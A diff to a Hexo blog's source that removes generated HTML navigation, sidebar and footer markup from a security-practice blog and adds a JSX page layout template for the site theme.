-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li></ul>
-
-    </footer>
-  </div>
-  
-    
-<nav id="article-nav">
-  
-    <a href="/2023/08/08/githappens/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          githappens
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2023/08/03/Mr-Robot-ctf/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">Mr-Robot-ctf</div>
-    </a>
-  
-</nav>
-
-  
-</article>
-
-
-</section>
-        
-          <aside id="sidebar">
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Categories</h3>
-    <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/hack-the-box/">hack the box</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/home/">home</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux%E5%AD%A6%E4%B9%A0/">linux学习</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tags</h3>
-    <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/burp-suite/" rel="tag">burp suite</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/chown/" rel="tag">chown</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/find/" rel="tag">find</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ftp/" rel="tag">ftp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fuzz/" rel="tag">fuzz</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gittools/" rel="tag">gittools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/home/" rel="tag">home</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hydra/" rel="tag">hydra</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux%E6%8F%90%E6%9D%83/" rel="tag">linux提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msf/" rel="tag">msf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/msfs/" rel="tag">msfs</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nmap/" rel="tag">nmap</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pspy/" rel="tag">pspy</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/shellinabox/" rel="tag">shellinabox</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ssh/" rel="tag">ssh</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/talnet/" rel="tag">talnet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tryhackme/" rel="tag">tryhackme</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/webshell/" rel="tag">webshell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%88%86%E7%A0%B4/" rel="tag">爆破</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" rel="tag">目录渗透</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" rel="tag">目录遍历</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" rel="tag">路径劫持</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Tag Cloud</h3>
-    <div class="widget tagcloud">
-      <a href="/tags/burp-suite/" style="font-size: 10px;">burp suite</a> <a href="/tags/chown/" style="font-size: 10px;">chown</a> <a href="/tags/find/" style="font-size: 10px;">find</a> <a href="/tags/ftp/" style="font-size: 10px;">ftp</a> <a href="/tags/fuzz/" style="font-size: 12.5px;">fuzz</a> <a href="/tags/gittools/" style="font-size: 10px;">gittools</a> <a href="/tags/hackmyvm/" style="font-size: 20px;">hackmyvm</a> <a href="/tags/home/" style="font-size: 10px;">home</a> <a href="/tags/hydra/" style="font-size: 10px;">hydra</a> <a href="/tags/linux%E6%8F%90%E6%9D%83/" style="font-size: 10px;">linux提权</a> <a href="/tags/msf/" style="font-size: 12.5px;">msf</a> <a href="/tags/msfs/" style="font-size: 10px;">msfs</a> <a href="/tags/nmap/" style="font-size: 10px;">nmap</a> <a href="/tags/pspy/" style="font-size: 10px;">pspy</a> <a href="/tags/shellinabox/" style="font-size: 10px;">shellinabox</a> <a href="/tags/ssh/" style="font-size: 10px;">ssh</a> <a href="/tags/talnet/" style="font-size: 10px;">talnet</a> <a href="/tags/tryhackme/" style="font-size: 17.5px;">tryhackme</a> <a href="/tags/webshell/" style="font-size: 15px;">webshell</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E6%B8%97%E9%80%8F/" style="font-size: 10px;">目录渗透</a> <a href="/tags/%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86/" style="font-size: 12.5px;">目录遍历</a> <a href="/tags/%E8%B7%AF%E5%BE%84%E5%8A%AB%E6%8C%81/" style="font-size: 10px;">路径劫持</a>
-    </div>
-  </div>
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Archives</h3>
-    <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/09/">September 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
-    </div>
-  </div>
-
-
-  
-    
-  <div class="widget-wrap">
-    <h3 class="widget-title">Recent Posts</h3>
-    <div class="widget">
-      <ul>
-        
-          <li>
-            <a href="/2023/09/18/hello-world/">Hello World</a>
-          </li>
-        
-          <li>
-            <a href="/2023/09/18/home/">home</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/30/linux%E6%8F%90%E6%9D%83/">linux提权</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/19/venus/">venus</a>
-          </li>
-        
-          <li>
-            <a href="/2023/08/11/flower/">flower</a>
-          </li>
-        
-      </ul>
-    </div>
-  </div>
-
-  
-</aside>
-        
-      </div>
-      <footer id="footer">
-  
-  <div class="outer">
-    <div id="footer-info" class="inner">
-      
-      &copy; 2023 honkerZ<br>
-      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
-    </div>
-  </div>
-</footer>
-
-    </div>
-    <nav id="mobile-nav">
-  
-    <a href="/" class="mobile-nav-link">Home</a>
-  
-    <a href="/archives" class="mobile-nav-link">Archives</a>
-  
-</nav>
-    
-
-
-<script src="/js/jquery-3.6.4.min.js"></script>
-
-
-
-  
-<script src="/fancybox/jquery.fancybox.min.js"></script>
-
-
-
-
-<script src="/js/script.js"></script>
-
-
-
-
-
-  </div>
-</body>
-</html>
+        let isPageOrPost = page.layout == 'page' || page.layout == 'post';
+        return <html lang={language ? language.substr(0, 2) : ''}>
+            <Head site={site} config={config} helper={helper} page={page} />
+            <body className={`is-${columnCount}-column has-navbar-fixed-top`}>
+                <Navbar config={config} helper={helper} page={page} />
+                <script type="text/javascript" src={my_cdn(url_for('/js/theme-setting.js'))}></script>
+                <section class="section">
+                    <div class="container">
+                        <div class="columns">
+                            <div class={classname({
+                                column: true,
+                                'order-2': true,
+                                'column-main': true,
+                                'is-12': columnCount === 1,
+                                'is-8-tablet is-8-desktop is-6-widescreen': (page.layout != 'post' && page.layout != 'page') && columnCount === 3,
+                                'is-8-tablet is-8-desktop is-9-widescreen': columnCount === 2 || page.layout === 'post'
+                            })} dangerouslySetInnerHTML={{__html: indexTopData + body}}></div>
+                            <Widgets site={site} config={config} helper={helper} page={page} position={'left'}/>
+                            {isPageOrPost ? null : <Widgets site={site} config={config} helper={helper} page={page} position={'right'}/>}
+                        </div>
+                    </div>
+                </section>
+                <Footer config={config} helper={helper} />
+                <Scripts site={site} config={config} helper={helper} page={page} />
+                <Search config={config} helper={helper} />
+                {use_pjax ? <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script> : null}
+                {use_pjax ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: pjaxJs }}></script> : null}
+                {isMath ? <script type="text/javascript" dangerouslySetInnerHTML={{ __html: mathJaxJs }}></script> : null}
+            </body>
+        </html>;
+    }
+};
